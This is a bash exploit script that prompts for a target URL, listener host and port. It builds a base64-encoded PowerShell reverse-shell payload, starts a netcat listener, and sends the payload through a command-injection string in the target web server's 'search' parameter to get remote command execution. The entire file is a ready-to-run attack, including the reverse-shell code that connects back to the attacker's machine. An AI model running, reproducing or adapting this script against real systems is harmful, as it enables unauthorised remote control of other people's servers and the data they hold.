#!/bin/bash

RED="\e[31m"
GREEN="\e[32m"
ENDCOLOR="\e[0m"
echo -e "${RED}Enter the base url of the target (http://target.com/)${ENDCOLOR}"
read target
echo -e "${RED}Your LHOST for reverse shell:${ENDCOLOR}"
read lhost
echo -e "${RED}Your LPORT for reverse shell:${ENDCOLOR}"
read lport
response=$(curl --write-out '%{http_code}' --silent --output /dev/null $target)
clear
if [[ ${target: -1} != "/" ]];then
	target="${target}/"
fi
raw_payload='$client = New-Object System.Net.Sockets.TCPClient("",);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
replaced="TCPClient(\"$lhost\",$lport)"
raw_payload="${raw_payload/'TCPClient("",)'/"$replaced"}"
encrypted_payload=$(echo $raw_payload | iconv -t UTF-16LE | base64 -w 0)
echo "Targets Status code is $response"
echo "--------------------------------------"
echo "Target     : $target"
echo "Local Host : $lhost"
echo "Local Port : $lport"
echo "--------------------------------------"
echo -e "${GREEN}Is this correct? [y/n]:${ENDCOLOR}"
read -n 1 choose
if [[ $choose == "y" ]];then
echo -e "${GREEN}\nOpening new terminal..${ENDCOLOR}"
gnome-terminal -- /bin/bash -c "echo 'Starting in 5 seconds'&&nc -lnvp $lport; exec bash"
sleep 5
curl "$target" -G -d "search=%00{.exec|C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe+-e+$encrypted_payload.}"
clear
elif [[ $choose == "n" ]];then
echo -e "\nExiting.."
sleep 1
clear
exit
fi
